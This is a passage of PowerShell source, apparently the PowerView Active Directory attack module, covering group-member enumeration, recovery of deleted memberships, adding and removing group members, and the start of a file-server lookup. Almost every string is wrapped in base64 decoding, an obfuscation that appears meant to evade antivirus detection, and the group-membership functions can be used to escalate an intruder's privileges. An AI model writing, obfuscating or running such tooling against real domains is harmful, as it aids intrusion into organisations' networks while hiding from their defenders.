                $Null = $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3"))))
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                    if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
                    }
                    elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                        if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                            
                            
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                    }
                    elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
                            $GroupName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRHcm91cE5hbWUp")))
                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $GroupDomain
                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJEdyb3VwRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
                }

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
                }

                $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJEZpbHRlcik=")))
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($GroupSearcher.filter))
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5ICckSWRlbnRpdHknOiB7MH0="))) -f $_)
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVy"))))

                    if ($Members.count -eq 0) {
                        
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyO3JhbmdlPSRCb3R0b20tJFRvcA==")))
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE1lbWJlclJhbmdl"))))
                            $Null = $GroupSearcher.PropertiesToLoad.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))
                            $Null = $GroupSearcher.PropertiesToLoad.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyO3JhbmdlPSo=")))
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))[0]
                                $GroupFoundDN = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))[0]
                        $GroupFoundDN = $Result.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Member
                    $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True
                    $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsY24sc2FtYWNjb3VudG5hbWUsb2JqZWN0c2lkLG9iamVjdGNsYXNz")))
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupFoundName
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZWlnblNlY3VyaXR5UHJpbmNpcGFsc3xTLTEtNS0yMQ==")))) {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU2ltcGxl"))) @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QA=="))))[1]
                                }
                                else {
                                    Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgY29udmVydGluZyAkTWVtYmVyRE4=")))
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgY29udmVydGluZyAkTWVtYmVyRE4=")))
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))) {
                        $MemberObjectClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))
                    }
                    elseif ($Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))) {
                        $MemberObjectClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))
                    }
                    elseif ($Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))) {
                        $MemberObjectClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $MemberDomain
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $MemberName
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWU="))) $MemberDN
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyT2JqZWN0Q2xhc3M="))) $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyU0lE"))) $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3VwTWVtYmVy"))))
                    $GroupMember

                    
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ==")))] -and $MemberDN -and ($MemberObjectClass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))))) {
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gTWFudWFsbHkgcmVjdXJzaW5nIG9uIGdyb3VwOiAkTWVtYmVyRE4=")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $MemberDN
                        $Null = $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))))
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ=="))),'distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENhdGVnb3J5PWdyb3VwKQ==")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))][0]
            ForEach($XMLNode in $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ==")))]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RFNfUkVQTF9WQUxVRV9NRVRBX0RBVEE="))) -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVy")))) -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBETg=="))) $ObjectDN
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRE4="))) $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZUZpcnN0QWRkZWQ="))) $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZURlbGV0ZWQ="))) $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nQ2hhbmdl"))) $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZXNBZGRlZA=="))) ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nRHNhRE4="))) $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZA=="))))
                        $Output
                    }
                }
                else {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWRdIEVycm9yIHJldHJpZXZpbmcgJ21zZHMtcmVwbHZhbHVlbWV0YWRhdGEnIGZvciAnJE9iamVjdERO")))
                }
            }
        }
    }
}


function Add-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiB7MH0="))) -f $_)
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r")))) {
                    $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gQWRkaW5nIG1lbWJlciAnJE1lbWJlcicgdG8gZ3JvdXAgJyRJZGVudGl0eQ==")))
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiB7MH0="))) -f $_)
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r")))) {
                    $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5Hcm91cE1lbWJlcl0gUmVtb3ZpbmcgbWVtYmVyICckTWVtYmVyJyBmcm9tIGdyb3VwICckSWRlbnRpdHk=")))
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

